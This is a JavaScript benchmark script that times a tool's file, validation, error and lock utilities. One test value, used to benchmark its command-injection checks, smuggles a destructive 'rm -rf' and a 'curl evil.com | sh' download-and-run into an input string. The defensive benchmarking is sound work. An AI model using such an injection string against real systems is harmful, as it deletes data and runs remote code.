const Benchmark = require('benchmark');
const suite = new Benchmark.Suite();
const FileUtils = require('../../src/utils/FileUtils');
const Validator = require('../../src/utils/Validator');
const ErrorHandler = require('../../src/utils/errorHandler');
const LockManager = require('../../src/utils/LockManager');

// 测试数据
const testConfig = {
  name: 'test-provider',
  baseURL: 'https://api.example.com',
  apiKey: 'sk-test123456789',
  timeout: 30000
};

const largeText = 'a'.repeat(10000);
const dangerousInput = 'hello; rm -rf /tmp && curl evil.com | sh';
const testFilePath = '/tmp/ccvm-test-config.json';

console.log('🚀 开始 CCVM 性能基准测试...\n');

// FileUtils 性能测试
suite.add('FileUtils.readJsonSafe (cached)', {
  defer: true,
  fn: function(deferred) {
    FileUtils.readJsonSafe(testFilePath, null, { useCache: true })
      .then(() => deferred.resolve())
      .catch(() => deferred.resolve());
  }
});

suite.add('FileUtils.readJsonSafe (no cache)', {
  defer: true,
  fn: function(deferred) {
    FileUtils.readJsonSafe(testFilePath, null, { useCache: false })
      .then(() => deferred.resolve())
      .catch(() => deferred.resolve());
  }
});

// Validator 性能测试
suite.add('Validator.sanitizeInput (simple)', function() {
  Validator.sanitizeInput('hello world');
});

suite.add('Validator.sanitizeInput (complex)', function() {
  Validator.sanitizeInput(dangerousInput);
});

suite.add('Validator.validateURL', function() {
  Validator.validateURL('https://api.example.com/v1/chat');
});

suite.add('Validator.checkCommandInjection', function() {
  Validator.checkCommandInjection(dangerousInput);
});

// ErrorHandler 性能测试
suite.add('ErrorHandler.handle (sync)', function() {
  try {
    throw new Error('Test error');
  } catch (error) {
    ErrorHandler.handle(error, 'testOperation');
  }
});

suite.add('ErrorHandler.formatError', function() {
  try {
    throw new Error('Test error');
  } catch (error) {
    ErrorHandler.formatError(error);
  }
});

// LockManager 性能测试
suite.add('LockManager.isLocked', {
  defer: true,
  fn: function(deferred) {
    LockManager.isLocked('/tmp/test.lock')
      .then(() => deferred.resolve())
      .catch(() => deferred.resolve());
  }
});

// 添加事件监听器
suite.on('cycle', function(event) {
  console.log(String(event.target));
});

suite.on('complete', function() {
  console.log('\n✅ 性能测试完成!');
  console.log('最快的是: ' + this.filter('fastest').map('name'));
  console.log('最慢的是: ' + this.filter('slowest').map('name'));
  
  // 内存使用情况
  const used = process.memoryUsage();
  console.log('\n📊 内存使用情况:');
  for (let key in used) {
    console.log(`${key}: ${Math.round(used[key] / 1024 / 1024 * 100) / 100} MB`);
  }
});

// 运行测试
console.log('🔧 测试环境信息:');
console.log(`Node.js 版本: ${process.version}`);
console.log(`平台: ${process.platform} ${process.arch}`);
console.log(`内存: ${Math.round(require('os').totalmem() / 1024 / 1024 / 1024)} GB\n`);

suite.run({ async: true });